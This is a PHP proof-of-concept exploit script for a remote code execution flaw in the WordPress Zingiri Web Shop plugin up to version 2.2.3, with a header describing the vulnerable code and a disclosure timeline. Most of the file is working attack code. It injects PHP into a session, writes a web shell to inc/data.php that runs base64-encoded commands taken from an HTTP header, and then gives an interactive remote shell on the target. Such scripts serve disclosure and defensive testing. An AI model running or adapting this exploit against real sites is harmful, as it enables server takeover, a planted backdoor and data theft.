<?php

/*
    ------------------------------------------------------------------------
    Wordpress Zingiri Web Shop Plugin <= 2.2.3 Remote Code Execution Exploit
    ------------------------------------------------------------------------
    
    author...............: Egidio Romano aka EgiX
    mail.................: n0b0d13s[at]gmail[dot]com
    software link........: http://wordpress.org/extend/plugins/zingiri-web-shop/
    affected versions....: from 0.9.12 to 2.2.3
    
    +-------------------------------------------------------------------------+
    | This proof of concept code was written for educational purpose only.    |
    | Use it at your own risk. Author will be not responsible for any damage. |
    +-------------------------------------------------------------------------+
    
    [-] vulnerable code in /fws/addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajax_save_name.php
    
    37.            @ob_start();
    38.            include_once(CLASS_SESSION_ACTION);
    39.            $sessionAction = new SessionAction();        
    40.            $selectedDocuments = $sessionAction->get();
    41.            if(removeTrailingSlash($sessionAction->getFolder()) == getParentPath($_POST['id']) && sizeof($selectedDocuments))
    42.            {
    43.                if(($key = array_search(basename($_POST['id']), $selectedDocuments)) !== false)
    44.                {
    45.                    $selectedDocuments[$key] = $_POST['value'];
    46.                    $sessionAction->set($selectedDocuments);
    47.                    
    48.                }
    49.                echo basename($_POST['id']) . "\n";
    50.                displayArray($selectedDocuments);
    51.                
    52.            }elseif(removeTrailingSlash($sessionAction->getFolder()) == removeTrailingSlash($_POST['id']))
    53.            {
    54.                $sessionAction->setFolder($_POST['id']);
    55.            }
    56.            writeInfo(ob_get_clean());
    
    An attacker could be able to manipulate the $selectedDocuments array that will be displayed at line 50,
    then at line 56 is called the 'writeInfo' function using the current buffer contents as argument.
    Like my recently discovered vulnerability (http://www.exploit-db.com/exploits/18075/), this function
    writes into a file called 'data.php' so an attacker could be able to execute arbitrary PHP code.
    
    [-] Note:
    
    The same vulnerability affects also the Joomla component (http://extensions.joomla.org/extensions/e-commerce/shopping-cart/13580)
    but isn't exploitable due to a misconfiguration in 'CONFIG_SYS_ROOT_PATH' constant definition.

    [-] Disclosure timeline:
    
    [23/10/2011] - Vulnerability discovered
    [25/10/2011] - Issue reported to http://forums.zingiri.com/
    [12/11/2011] - Version 2.2.4 released
    [13/11/2011] - Public disclosure

*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

$fileman = "wp-content/plugins/zingiri-web-shop/fws/addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager";

function http_send($host, $packet)
{
    if (!($sock = fsockopen($host, 80)))
        die( "\n[-] No response from {$host}:80\n");

    fwrite($sock, $packet);
    return stream_get_contents($sock);
}

function get_root_dir()
{
    global $host, $path, $fileman;
    
    $packet  = "GET {$path}{$fileman}/ajaxfilemanager.php HTTP/1.0\r\n";
    $packet .= "Host: {$host}\r\n";
    $packet .= "Connection: close\r\n\r\n";
    
    if (!preg_match('/currentFolderPath" value="([^"]*)"/', http_send($host, $packet), $m)) die("\n[-] Root folder path not found!\n");
    return $m[1];
}

function random_mkdir()
{
    global $host, $path, $fileman, $rootdir;
    
    $dirname = uniqid();
    
    $payload = "new_folder={$dirname}&currentFolderPath={$rootdir}";
    $packet  = "POST {$path}{$fileman}/ajax_create_folder.php HTTP/1.0\r\n";
    $packet .= "Host: {$host}\r\n";
    $packet .= "Content-Length: ".strlen($payload)."\r\n";
    $packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
    $packet .= "Connection: close\r\n\r\n{$payload}";
    
    http_send($host, $packet);    
    return $dirname;
}

print "\n+----------------------------------------------------------------------------------+";
print "\n| Wordpress Zingiri Web Shop Plugin <= 2.2.3 Remote Code Execution Exploit by EgiX |";
print "\n+----------------------------------------------------------------------------------+\n";

if ($argc < 3)
{
    print "\nUsage......: php $argv[0] <host> <path>\n";
    print "\nExample....: php $argv[0] localhost /";
    print "\nExample....: php $argv[0] localhost /wordpress/\n";
    die();
}

$host = $argv[1];
$path = $argv[2];

$rootdir = get_root_dir();
$phpcode = "<?php error_reporting(0);print(_code_);passthru(base64_decode(\$_SERVER[HTTP_CMD]));die; ?>";

$payload = "selectedDoc[]={$phpcode}&currentFolderPath={$rootdir}";
$packet  = "POST {$path}{$fileman}/ajax_file_cut.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
$packet .= "Connection: close\r\n\r\n{$payload}";

if (!preg_match("/Set-Cookie: ([^;]*);/", http_send($host, $packet), $sid)) die("\n[-] Session ID not found!\n");

$dirname = random_mkdir();
$newname = uniqid();

$payload = "value={$newname}&id={$rootdir}{$dirname}";
$packet  = "POST {$path}{$fileman}/ajax_save_name.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Cookie: {$sid[1]}\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
$packet .= "Connection: close\r\n\r\n{$payload}";

http_send($host, $packet);

$packet  = "GET {$path}{$fileman}/inc/data.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Cmd: %s\r\n";
$packet .= "Connection: close\r\n\r\n";

while(1)
{
    print "\nzingiri-shell# ";
    if (($cmd = trim(fgets(STDIN))) == "exit") break;
    preg_match("/_code_(.*)/s", http_send($host, sprintf($packet, base64_encode($cmd))), $m) ?
    print $m[1] : die("\n[-] Exploit failed!\n");
}

?>